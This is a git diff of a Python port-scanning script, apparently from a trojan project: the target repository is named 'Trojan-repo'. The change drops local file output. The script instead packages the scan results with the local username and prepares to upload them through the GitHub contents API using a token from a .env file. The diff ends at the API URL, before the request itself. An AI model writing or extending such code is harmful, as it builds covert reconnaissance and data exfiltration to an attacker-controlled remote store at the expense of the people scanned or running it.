@@ -1,12 +1,10 @@
 import socket
-import platform
-import psutil
-from datetime import datetime
+import threading
 import os
 import json
 import requests
 import base64
-import threading
+from datetime import datetime
 from dotenv import load_dotenv
 
 class Portscan:
@@ -57,34 +55,21 @@ open_ports = security_tool.scan(target_ip, ports)
 # Print the open ports
 print(f"Open ports: {open_ports}")
 
-# Create a unique file name for the output
+# Prepare the data to be uploaded
 username = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
 current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-output_file = f"open_ports_{username}_{current_time}.json"
-
-# Write the open ports to the output file
-with open(output_file, "w") as file:
-    json.dump({"target_ip": target_ip, "open_ports": open_ports}, file, indent=4)
-
-print(f"Open ports have been saved to {output_file}.")
-
-# Read the content of the output file into a variable
-with open(output_file, "r") as file:
-    data = json.load(file)
-
-# The content of the output file is now stored in the variable 'data'
-print("Data from file:", data)
+file_path = f"data/portscan_{username}_{current_time}.json"  # Dynamic file path
+data = {"target_ip": target_ip, "open_ports": open_ports}
+file_content = json.dumps(data, indent=4)  # Convert dict to JSON string for GitHub
 
 # GitHub repository details
 repository_owner = "BlertaJashanica"
 repository_name = "Trojan-repo"
-file_path = f"data/portscan_{username}_{current_time}.json"  # Dynamic file path
-file_content = json.dumps(data, indent=4)  # Convert dict to JSON string for GitHub
 
 load_dotenv()  # Load environment variables from .env file
 github_token = os.getenv("GITHUB_TOKEN")
 
-commit_message = 'Updated portscan data'
+commit_message = f"Portscan results for {username} at {current_time}"
 
 # GitHub API URL
 api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
